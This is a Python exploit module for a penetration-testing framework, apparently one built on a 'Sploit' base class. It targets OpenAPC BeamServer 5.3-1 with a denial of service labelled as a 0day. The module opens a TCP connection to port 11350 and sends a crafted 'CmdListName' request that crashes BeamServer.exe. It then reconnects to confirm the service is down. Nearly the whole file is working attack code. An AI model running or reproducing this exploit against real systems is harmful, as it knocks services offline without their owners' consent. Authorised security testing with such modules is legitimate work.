#!/usr/bin/env python

import socket
import time
from collections import OrderedDict
from Sploit import Sploit


INFO = {}
INFO['NAME'] = "efs_OpenAPC_BeamServer_DoS"
INFO['DESCRIPTION'] = "OpenAPC BeamServer DoS"
INFO['VENDOR'] = "https://www.openapc.com/"
INFO["CVE Name"] = "0day"
INFO["DOWNLOAD_LINK"] = "https://www.openapc.com/download.php"
INFO["LINKS"] = []
INFO['CHANGELOG'] = "8 Jun, 2018"
INFO['PATH'] = "General/"
INFO["NOTES"] = """
    Specially crafted TCP request crashes BeamServer.exe. 
Tested against OpenAPC 5.3-1 on Windows 7 SP1 x64.
"""

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS["HOST"] = "192.168.1.103"
OPTIONS["PORT"] = 11350


class exploit(Sploit):
    def __init__(self, host="",
                 port=0, ssl=False,
                 logger=None):
        Sploit.__init__(self, logger=logger)
        self.name = INFO['NAME']

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get("HOST", OPTIONS["HOST"])
        self.port = self.args.get("PORT", OPTIONS["PORT"])

    def run(self):
        # Get options from gui
        self.args()
        self.log('[*] Testing connection to BeamServer')
        s = socket.socket()
        s.connect((self.host, self.port))
        self.log('[*] Sending DoS packet')
        s.send('CmdListName\r\n')
        self.log('[*] Checking BeamServer...')
        time.sleep(5)
        try:
            s.connect((self.host, self.port))
        except:
            self.log('[+] Service not responds')
            self.finish(True)
        self.log('[-] Service is still alive')
        self.finish(False)


if __name__ == '__main__':
    """
    By now we only have the tool
    mode for exploit..
    Later we would have
    standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1", 80)
    e.run()